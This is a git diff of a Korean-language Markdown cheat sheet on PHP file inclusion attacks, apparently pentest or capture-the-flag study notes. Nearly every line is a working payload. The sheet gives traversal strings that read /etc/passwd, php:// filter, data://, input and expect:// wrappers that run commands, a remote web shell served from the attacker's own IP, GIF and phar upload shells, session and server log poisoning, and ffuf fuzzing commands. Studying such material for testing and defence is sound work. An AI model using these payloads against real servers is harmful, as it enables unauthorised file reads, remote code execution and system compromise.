@@ -509,7 +509,7 @@ if (isset($_GET['c'])) {
 | `Response.WriteFile()`       |        ✅         |      ❌      |       ❌        |
 | `include`                    |        ✅         |      ✅      |       ✅        |
 
-## Basic LFI
+### Basic LFI
 ```/index.php?language=/etc/passwd```<br/>
 ```/index.php?language=../../../../etc/passwd```<br/>
 ```/index.php?language=/../../../etc/passwd```<br/>
@@ -517,32 +517,45 @@ if (isset($_GET['c'])) {
 ```/index.php?language=./languages/../../../../etc/passwd```<br/>
 ``` GET /index.php?language=languages/....//....//....//....//...//flag.txt```
 
-## LFI Bypasses
+### LFI Bypasses
 ```/index.php?language=....//....//....//....//....//etc/passwd```<br/>
 ```/index.php?language=%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%65%74%63%2f%70%61%73%73%77%64```<br/>
 ```/index.php?language=non_existing_directory/../../../etc/passwd/./././.[./ REPEATED ~2048 times]```<br/>
 ```echo -n "non_existing_directory/../../../etc/passwd/" && for i in {1..2048}; do echo -n "./"; done```<br/>
 ```/index.php?language=../../../../etc/passwd%00```<br/>
 ```/index.php?language=php://filter/read=convert.base64-encode/resource=config```
+
+### PHP Files 퍼징
+```ffuf -w /opt/useful/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://<SERVER_IP>:<PORT>/FUZZ.php```
   
-## Source Code 노출
+### Source Code 노출
 ```/index.php?language=php://filter/read=convert.base64-encode/resource=configure```
 
-## PHP Wrappers
-```/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=id```<br/>
-```echo '<?php system($_GET["cmd"]); ?>' | base64```<br/>
-```curl "http://<SERVER_IP>:<PORT>/index.php?language=php://filter/read=convert.base64-encode/resource=../../../../etc/php/7.4/apache2/php.ini"```<br/>
+### PHP Wrappers
+
+#### PHP Configurations 체크
+```curl "http://<SERVER_IP>:<PORT>/index.php?language=php://filter/read=convert.base64-encode/resource=../../../../etc/php/7.4/apache2/php.ini"```
+
+#### Remote Code Execution
+```
+echo '<?php system($_GET["cmd"]); ?>' | base64
+/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=id
+```
+
+#### Input
 ```curl -s -X POST --data '<?php system($_GET["cmd"]); ?>' "http://<SERVER_IP>:<PORT>/index.php?language=php://input&cmd=id"```<br/>
+
+#### Expect
 ```curl -s "http://<SERVER_IP>:<PORT>/index.php?language=expect://id"```
 
-## RFI Remote File Inclusion
+### RFI Remote File Inclusion
 ```
 echo '<?php system($_GET["cmd"]); ?>' > shell.php
 sudo python3 -m http.server <LISTENING_PORT>
 ```
 ```/index.php?language=http://<OUR_IP>:<LISTENING_PORT>/shell.php&cmd=id```
 
-## LFI & File Upload
+### LFI & File Upload
 ```
 echo 'GIF8<?php system($_GET["cmd"]); ?>' > shell.gif
 /index.php?language=./profile_images/shell.gif&cmd=id
@@ -567,33 +580,43 @@ php --define phar.readonly=0 shell.php && mv shell.phar shell.jpg
 /index.php?language=phar://./profile_images/shell.jpg%2Fshell.txt&cmd=id
 ```
 
+<br/><br/>
 ## Log Poisoning
 
 ### PHP Session Poisoning
-```http://<SERVER_IP>:<PORT>/index.php?language=session_poisoning```
-```http://<SERVER_IP>:<PORT>/index.php?language=%3C%3Fphp%20system%28%24_GET%5B%22cmd%22%5D%29%3B%3F%3E```
-```/index.php?language=/var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd&cmd=id```
 
+```http://<SERVER_IP>:<PORT>/index.php?language=session_poisoning```
+```
+PHPSESSID=nhhv8i0o6ua4g88bkdl9u1fdsd
+http://<SERVER_IP>:<PORT>/index.php?language=/var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd
+```
+```
+http://<SERVER_IP>:<PORT>/index.php?language=%3C%3Fphp%20system%28%24_GET%5B%22cmd%22%5D%29%3B%3F%3E
+/index.php?language=/var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd&cmd=id
+```
 
 ### Server Log Poisoning
 ```curl -s "http://<SERVER_IP>:<PORT>/index.php" -A "<?php system($_GET['cmd']); ?>"```
 
-## Fuzzing Parameters
+<br/><br/>
+## 자동 스캐닝
+
+### Fuzzing Parameters
 ```ffuf -w /opt/useful/seclists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?FUZZ=value' -fs 2287```
 > 참고 : [Top 25 parameters](https://book.hacktricks.wiki/en/pentesting-web/file-inclusion/index.html#top-25-parameters)
 
-## LFI wordlists
+### LFI wordlists
 ```ffuf -w /opt/useful/seclists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=FUZZ' -fs 2287```
 
-## Fuzzing Server Files
+### Fuzzing Server Files
 
-### Server Webroot
+#### Server Webroot
 ```ffuf -w /opt/useful/seclists/Discovery/Web-Content/default-web-root-directory-linux.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=../../../../FUZZ/index.php' -fs 2287```
 
-### Server Logs/Configurations
+#### Server Logs/Configurations
 ```ffuf -w ./LFI-WordList-Linux:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=../../../../FUZZ' -fs 2287```
 
-## 단어 목록
+### 단어 목록
 - [LFI-Jhaddix.txt](https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/LFI/LFI-Jhaddix.txt)
 - [Linux용 단어 목록](https://raw.githubusercontent.com/DragonJAR/Security-Wordlist/main/LFI-WordList-Linux)
 - [Windows용 단어 목록](https://raw.githubusercontent.com/DragonJAR/Security-Wordlist/main/LFI-WordList-Windows)
